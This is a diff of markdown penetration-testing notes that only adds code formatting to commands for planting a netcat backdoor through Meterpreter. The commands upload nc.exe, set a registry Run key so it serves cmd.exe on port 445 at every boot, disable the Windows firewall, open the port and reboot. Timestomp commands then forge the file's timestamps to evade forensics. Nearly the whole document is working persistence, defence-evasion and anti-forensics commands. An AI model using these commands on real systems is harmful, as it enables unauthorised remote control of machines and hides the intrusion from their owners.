@@ -5,21 +5,21 @@
 Post exploit netcat Backdoor:
 
 Open meterpreter >
-- upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
-- reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
-- reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
-- reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
-- execute -f cmd -i
+- `upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32`
+- `reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run`
+- `reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'`
+- `reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc`
+- `execute -f cmd -i`
 
-C: Windows\system 32 > 
-- netsh advfirewall set allprofiles state off
-- netsh advfirewall show allprofiles
-- netsh advfirewall firewall add rule name="Open Port 445" dir=in action=allow protocol=TCP localport=445
-- netsh firewall show port
-- Shutdown -r -t 0
+`C:Windows\system32>`
+- `netsh advfirewall set allprofiles state off`
+- `netsh advfirewall show allprofiles`
+- `netsh advfirewall firewall add rule name="Open Port 445" dir=in action=allow protocol=TCP localport=445`
+- `netsh firewall show port`
+- `Shutdown -r -t 0`
 
 Open New Terminal
-- nc -v 10.0.x.8 445
+- `nc -v 10.0.x.8 445`
 
 ***might work might not***
 
@@ -35,10 +35,8 @@ Check the time stamp of file
 Change the time to the CMD.exe time
 `meterpreter> timestomp YOURFILE.exe -f C:\\WINNT\\system32\\cmd.exe`
 
-
 Then validate:
 `meterpreter> timestomp YOURFILE.exe -v`
-
 
 Reference: 
 https://www.offensive-security.com/metasploit-unleashed/TimeStomp/
